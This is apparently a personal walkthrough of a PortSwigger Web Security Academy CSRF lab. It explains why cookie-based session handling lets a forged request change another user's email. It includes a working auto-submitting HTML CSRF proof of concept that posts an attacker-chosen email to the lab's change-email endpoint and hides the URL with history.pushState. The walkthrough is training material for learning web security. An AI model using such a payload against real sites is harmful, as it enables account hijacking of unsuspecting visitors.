***
This lab's email change functionality is vulnerable to CSRF.
To solve the lab, craft some HTML that uses a [CSRF attack](https://portswigger.net/web-security/csrf) to change the viewer's email address and upload it to your exploit server.
You can log in to your own account using the following credentials: `wiener:peter`
***
## when we login:
we see a change email functionality:
![[walkthroughs/Portswigger/CSRF/IMg/Pasted image 20230817161412.png]]
When tried on diff browser without logging: login page was triggered
this was the request:
![[walkthroughs/Portswigger/CSRF/IMg/Pasted image 20230817161628.png]]
our email was changed , can we recreate the request and change someone else's account email?
but we can't -> since it's using cookies to authenticate
We can't get user's cookie , but what if user sends this request by itself?
# There is only one option left:
make user click on the link so that the request gives it's own cookie of that user to the server and the email is changed

***flow:
login -> cookie assign -> email change on the basis of cookie-> if cookie == valid : change email -> end
else: deny***

When we make a request form that when loaded creates the same request and sends it to the server , thus when someone clicks or visits the link , his/hers email is changed automatically
```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a6c00cb0376ba5781476cdd00c60035.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="attacker&#64;attacker&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```
![[walkthroughs/Portswigger/CSRF/IMg/Pasted image 20230817162714.png]]
